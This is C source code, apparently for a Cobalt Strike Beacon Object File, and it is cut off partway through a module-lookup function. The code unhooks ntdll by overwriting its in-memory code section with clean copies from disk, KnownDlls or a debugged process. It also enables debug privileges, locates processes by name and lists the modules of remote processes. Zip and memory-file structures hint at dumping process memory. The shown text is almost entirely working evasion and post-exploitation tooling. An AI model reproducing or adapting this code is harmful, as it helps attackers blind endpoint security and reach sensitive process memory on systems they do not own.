#include <windows.h>
#include "beacon.h"

#define MAX_PATH 260
#define MAX_MODULES 1024
#define ALPHANUM "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
#define ALPHANUM_SIZE (sizeof(ALPHANUM) - 1)
#define SECTION_MAP_READ 0x0004
#define OBJ_CASE_INSENSITIVE 0x00000040
#define process_basic_information_size 48
#define peb_offset 0x8
#define ldr_offset 0x18
#define inInitializationOrderModuleList_offset 0x30
#define ProcessBasicInformation 0
#define flink_dllbase_offset 0x20
#define flink_buffer_offset 0x50
#define zero_memory 0x00000008
#define max_string_length 1024
#define commandline_offset 0x68
#define processparameters_offset 0x20
#define flink_buffer_fulldllname_offset 0x40


// Structs
typedef struct {
    char base_dll_name[MAX_PATH];
    char full_dll_path[MAX_PATH];
    void* dll_base;
    int size;
} ModuleInformation;

typedef struct {
    char filename[20];
    unsigned char* content;
    void* address;
    size_t size;
} MemFile;

typedef struct _TOKEN_PRIVILEGES_STRUCT {
    DWORD PrivilegeCount;
    LUID Luid;
    DWORD Attributes;
} TOKEN_PRIVILEGES_STRUCT;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// New ZipFile structure
typedef struct {
    char* filename;
    char* content;
    size_t size;
} ZipFile;

#pragma pack(push, 1)  // Disable padding

struct LocalFileHeader {
    int signature;           // 0x04034b50
    short version;             // Version needed to extract
    short flag;                // General purpose bit flag
    short compression;         // Compression method (0 = no compression)
    short modTime;             // Last mod file time
    short modDate;             // Last mod file date
    int crc32;               // CRC-32
    int compressedSize;      // Compressed size
    int uncompressedSize;    // Uncompressed size
    short filenameLength;      // Filename length
    short extraFieldLength;    // Extra field length
};

struct CentralDirectoryHeader {
    int signature;           // 0x02014b50
    short versionMadeBy;       // Version made by
    short versionNeeded;       // Version needed to extract
    short flag;                // General purpose bit flag
    short compression;         // Compression method
    short modTime;             // Last mod file time
    short modDate;             // Last mod file date
    int crc32;               // CRC-32
    int compressedSize;      // Compressed size
    int uncompressedSize;    // Uncompressed size
    short filenameLength;      // Filename length
    short extraFieldLength;    // Extra field length
    short commentLength;       // File comment length
    short diskNumberStart;     // Disk number where file starts
    short internalFileAttr;    // Internal file attributes
    int externalFileAttr;    // External file attributes
    int relativeOffset;      // Offset of local header
};

struct EndOfCentralDirectory {
    int signature;           // 0x06054b50
    short diskNumber;          // Number of this disk
    short centralDirDisk;      // Number of the disk with the start of the central directory
    short numEntriesOnDisk;    // Number of entries in the central directory on this disk
    short totalEntries;        // Total number of entries in the central directory
    int centralDirSize;      // Size of the central directory
    int centralDirOffset;    // Offset of start of central directory, relative to start of archive
    short commentLength;       // ZIP file comment length
};

#pragma pack(pop)  // Enable padding

// Functions
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlGetVersion(POSVERSIONINFOW);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAdjustPrivilegesToken(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtGetNextProcess(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory( HANDLE, PVOID, LPVOID, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH,LPBOOL);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$SystemFunction036(PVOID, ULONG);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileMappingA(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$MapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DebugActiveProcessStop(DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);

void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a) {
    p->Length = sizeof(OBJECT_ATTRIBUTES);
    p->RootDirectory = NULL;
    p->Attributes = a;
    p->ObjectName = n;
    p->SecurityDescriptor = NULL;
    p->SecurityQualityOfService = NULL;
}

UNICODE_STRING InitUnicodeString(LPCWSTR str) {
    UNICODE_STRING us;
    int data_len = MyWcsLen(str);
    us.Buffer = (PWSTR)str;
    us.Length = data_len * sizeof(WCHAR); // Using lstrlenW for length
    us.MaximumLength = us.Length + sizeof(WCHAR);
    return us;
}


//////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////
void MyMemcpy(char* dest, const char* src, int size) {
    for (int i = 0; i < size; i++) {
        dest[i] = src[i];  // Manually copy each byte
    }
}


void *my_memset(void *ptr, int value, size_t num) {
    unsigned char *p = (unsigned char *)ptr;
    while (num--) {
        *p++ = (unsigned char)value;
    }
    return ptr;
}


int MyWcsLen(LPCWSTR str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}


int MyStrCmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}


void MyIntToHexStr(long long value, char* buffer) {
    int i;
    for (i = 15; i >= 0; i--) {
        int nibble = value & 0xF;
        if (nibble < 10) {
            buffer[i] = '0' + nibble;
        } else {
            buffer[i] = 'A' + (nibble - 10);
        }
        value >>= 4;
    }
    buffer[16] = '\0';
}


void MyIntToStr(int value, char* buffer) {
    char temp[12];
    int i = 0;
    int is_negative = 0;
    if (value < 0) {
        is_negative = 1;
        value = -value;
    }
    do {
        temp[i++] = (value % 10) + '0';
        value /= 10;
    } while (value > 0);
    if (is_negative) {
        temp[i++] = '-';
    }
    int j = 0;
    while (i > 0) {
        buffer[j++] = temp[--i];
    }    
    buffer[j] = '\0';
}


void MyStrcpy(char* dest, const char* src, size_t max_len) {
    size_t i = 0;
    while (i < max_len - 1 && src[i] != '\0') {
        dest[i] = src[i];
        i++;
    }
    dest[i] = '\0';
}


int MyStrLen(char *str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}

PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 8);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 8, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error \n");
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


char* ConvertUnicodeToAnsi(HANDLE hHeap, WCHAR* unicodeStr) {
    int bufferSize = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, unicodeStr, -1, NULL, 0, NULL, NULL);
    if (bufferSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to calculate ANSI string size.\n");
        return NULL;
    }
    char* ansiStr = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
    if (ansiStr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for ANSI string.\n");
        return NULL;
    }
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, unicodeStr, -1, ansiStr, bufferSize, NULL, NULL);
    return ansiStr;    
}


char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 256);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 256, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading remote memory. NTSTATUS: 0x%X\n", ntstatus);
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
    }
    WCHAR* unicodeStr = (WCHAR*)buff;

    char* ansiStr = ConvertUnicodeToAnsi(hHeap, unicodeStr);
    if (ansiStr == NULL) {
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
        return;
    }

    KERNEL32$HeapFree(hHeap, 0, buff);
    return ansiStr;
}


void* GetModuleAddr() {
    HANDLE process_handle = (HANDLE) -1;
    
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }

    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    // PEB
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);

    // PEB->Ldr
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_address = ReadRemoteIntPtr(process_handle, ldr_pointer);

    // Ldr->InitializationOrderModuleList
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_address + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(process_handle, InInitializationOrderModuleList);
    
    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        // DLL base address
        dll_base = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        // DLL name
        void* buffer = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(process_handle, buffer);
        if(MyStrCmp(base_dll_name, "ntdll.dll") == 0){
            return dll_base;
        }
        // DLL full path
        BeaconPrintf(CALLBACK_OUTPUT, "[+] base_dll_name %s\n", base_dll_name); 
        next_flink = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + 0x10));
    }
    return 0;
}


int* GetTextSectionInfo(LPVOID ntdll_address) {
    SIZE_T bytesRead;
    HANDLE hProcess = (HANDLE) -1;
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll_addr: \t\t0x%p\n", ntdll_address);

    // Read e_lfanew (4 bytes) at offset 0x3C
    DWORD e_lfanew;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading e_lfanew\n");
    }

    // Read SizeOfCode (4 bytes)
    DWORD sizeofcode;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading SizeOfCode\n");
    }

    // Read BaseOfCode (4 bytes)
    DWORD baseofcode;
    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) || bytesRead != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading BaseOfCode\n");
    }

    // Return BaseOfCode and SizeOfCode as an array
    static int result[2];
    result[0] = baseofcode;
    result[1] = sizeofcode;

    return result;
}


LPVOID MapNtdllFromDisk(const char* ntdll_path) {
    HANDLE hFile = KERNEL32$CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CreateFileA\n");
    }

    // CreateFileMappingA
    HANDLE hSection = KERNEL32$CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (hSection == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CreateFileMappingA\n");
        KERNEL32$CloseHandle(hFile);
    }

    // MapViewOfFile
    LPVOID pNtdllBuffer = KERNEL32$MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling MapViewOfFile\n");
        KERNEL32$CloseHandle(hSection);
        KERNEL32$CloseHandle(hFile);
    }

    // Close handles
    if (!KERNEL32$CloseHandle(hFile) || !KERNEL32$CloseHandle(hSection)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CloseHandle\n");
    }

    return pNtdllBuffer;
}


LPVOID MapNtdllFromKnownDlls() {
    LPCWSTR dll_name = L"\\KnownDlls\\ntdll.dll";
    UNICODE_STRING us;
    us = InitUnicodeString(dll_name);

    // Initialize OBJECT_ATTRIBUTES for the section object
    OBJECT_ATTRIBUTES obj_attr;
    InitializeObjectAttributes(&obj_attr, &us, OBJ_CASE_INSENSITIVE);

    // Open the section for the DLL
    HANDLE hSection = NULL;
    NTSTATUS status = NTDLL$NtOpenSection(&hSection, SECTION_MAP_READ, &obj_attr);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtOpenSection. NTSTATUS: 0x%X\n", status);
    }

    // Map the section into memory
    LPVOID pNtdllBuffer = KERNEL32$MapViewOfFile(hSection, SECTION_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling MapViewOfFile\n");
        NTDLL$NtClose(hSection);
    }

    // Close the section handle
    status = NTDLL$NtClose(hSection);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtClose. NTSTATUS: 0x%X\n", status);
    }

    return pNtdllBuffer;
}


// Translated function
LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    BOOL createprocess_res;

    // Initialize structures
    my_memset(&si, 0, sizeof(si));
    si.cb = sizeof(STARTUPINFOA);
    my_memset(&pi, 0, sizeof(pi));

    // Create process with DEBUG_PROCESS flag
    createprocess_res = KERNEL32$CreateProcessA(
        process_path,
        NULL,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!createprocess_res) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling CreateProcess\n");
    }

    void* localNtdllHandle = GetModuleAddr();
    int* result = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = result[0];
    int localNtdllTxtSize = result[1];
    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);

    // Allocate memory for the buffer to hold the ntdll text section
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    BYTE* ntdllBuffer = (BYTE*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, localNtdllTxtSize);
    
    if (!ntdllBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error allocating memory for ntdll buffer\n");
    }

    // Read the ntdll text section from the target process
    SIZE_T bytesRead;
    BOOL readprocmem_res = KERNEL32$ReadProcessMemory(
        pi.hProcess,
        localNtdllTxt,
        ntdllBuffer,
        localNtdllTxtSize,
        &bytesRead
    );

    if (!readprocmem_res || bytesRead != localNtdllTxtSize) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading process memory\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;

    // Stop debugging the process and terminate it
    BOOL debugstop_res = KERNEL32$DebugActiveProcessStop(pi.dwProcessId);
    BOOL terminateproc_res = KERNEL32$TerminateProcess(pi.hProcess, 0);
    if (!debugstop_res || !terminateproc_res) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    // Close process and thread handles
    BOOL closehandle_proc = KERNEL32$CloseHandle(pi.hProcess);
    BOOL closehandle_thread = KERNEL32$CloseHandle(pi.hThread);
    if (!closehandle_proc || !closehandle_thread) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling CloseHandle\n");
        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
    }

    return pNtdllBuffer;
}


void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
    DWORD dwOldProtection;

    // Change protection to PAGE_EXECUTE_WRITECOPY
    if (!KERNEL32$VirtualProtect(localNtdllTxt, localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        BeaconPrintf(CALLBACK_ERROR, "Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)\n");
        return;  // Exit function on failure
    }
    
    // Manually copy the memory (replace memcpy)
    unsigned char *src = (unsigned char *)unhookedNtdllTxt;
    unsigned char *dst = (unsigned char *)localNtdllTxt;
    for (SIZE_T i = 0; i < localNtdllTxtSize; i++) {
        dst[i] = src[i];
    }

    // Restore original memory protection
    if (!KERNEL32$VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        BeaconPrintf(CALLBACK_ERROR, "Error calling VirtualProtect (dwOldProtection)\n");
        return;

    }
}


void ReplaceLibrary(const char* option){
    long long unhookedNtdllTxt = 0;
    LPVOID unhookedNtdllHandle;
    const int offset_mappeddll = 4096;

    if (MyStrCmp(option, "disk") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: disk\n");
        const char* ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
        unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
        unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
    }
    else if (MyStrCmp(option, "knowndlls") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: knowndlls\n");
        unhookedNtdllHandle = MapNtdllFromKnownDlls();
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
        unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);

    }
    else if (MyStrCmp(option, "debugproc") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: debugproc\n");
        const char* proc_path = "c:\\Windows\\System32\\notepad.exe";     
        unhookedNtdllTxt = MapNtdllFromDebugProc(proc_path);
        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
    }
    else{
        return;
    }

    // Replace
    void* localNtdllHandle = GetModuleAddr();
    int* textSectionInfo = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = textSectionInfo[0];
    int localNtdllTxtSize = textSectionInfo[1];
    long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;

    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtBase: \t\t0x%p\n", localNtdllTxtBase);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtSize: \t\t0x%p\n", localNtdllTxtSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying %d bytes from 0x%p to 0x%p.\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);

    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
}
//////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////


void EnableDebugPrivileges() {
    HANDLE currentProcess = (HANDLE) -1;
    HANDLE tokenHandle = NULL;
    NTSTATUS ntstatus = NTDLL$NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20;
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = SE_PRIVILEGE_ENABLED;
    ntstatus = NTDLL$NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES_STRUCT), NULL, NULL);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X\n", ntstatus);
        NTDLL$NtClose(tokenHandle);
        return;
    }

    if (tokenHandle != NULL) {
        NTDLL$NtClose(tokenHandle);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Debug privileges enabled successfully.\n");
}


char* GetProcNameFromHandle(HANDLE process_handle) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }
    
    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    // PEB 
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;

    // PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);
    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);

    // ProcessParameters->CommandLine
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);
    return commandline_value;
}


void to_lowercase(char *str) {
    while (*str) {
        if (*str >= 'A' && *str <= 'Z') {
            *str = *str + ('a' - 'A');
        }
        str++;
    }
}


HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;
    NTSTATUS status;
    while ((status = NTDLL$NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle)) == 0) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        to_lowercase(current_proc_name);
        if (current_proc_name && MyStrCmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }
    }
    return NULL;
}


ModuleInformation* CustomGetModuleHandle(HANDLE process_handle, int* out_module_counter) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }
    
    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);

    // Get PEB->Ldr
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_address = ReadRemoteIntPtr(process_handle, ldr_pointer);

    // Ldr->InitializationOrderModuleList
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_address + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(process_handle, InInitializationOrderModuleList);
    
    KERNEL32$HeapFree(hHeap, 0, pbi_addr);
    int module_counter = 0;
    ModuleInformation* module_list = (ModuleInformation*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ModuleInformation) * MAX_MODULES);
    if (!module_list) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for module_list.");
        return;
    }

    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        // DLL base address
        dll_base = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        // DLL name
        void* buffer = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(process_handle, buffer);
        // DLL full path
        void* full_dll_name_addr = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
        char* full_dll_path = ReadRemoteWStr(process_handle, full_dll_name_addr);
        if(dll_base != 0){
            ModuleInformation module_info;
            module_info.dll_base = dll_base;
            module_info.size = 0;
            int i;
            for (i = 0; i < MAX_PATH - 1 && base_dll_name[i] != '\0'; i++) {
                module_info.base_dll_name[i] = base_dll_name[i];
            }
            module_info.base_dll_name[i] = '\0';
            int j;
            for (j = 0; j < MAX_PATH - 1 && full_dll_path[j] != '\0'; j++) {
                module_info.full_dll_path[j] = full_dll_path[j];
            }
            module_info.full_dll_path[j] = '\0';
            module_list[module_counter] = module_info;
            module_counter++;
        }       
        next_flink = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + 0x10));
    }
    // Return the module list
    *out_module_counter = module_counter;
    return module_list;
}


ModuleInformation find_module_by_name(ModuleInformation* moduleInformationList, int module_counter, const char* aux_name) {
    for (int i = 0; i < module_counter; i++) {
        if (MyStrCmp(moduleInformationList[i].base_dll_name, aux_name) == 0) {
            return moduleInformationList[i];
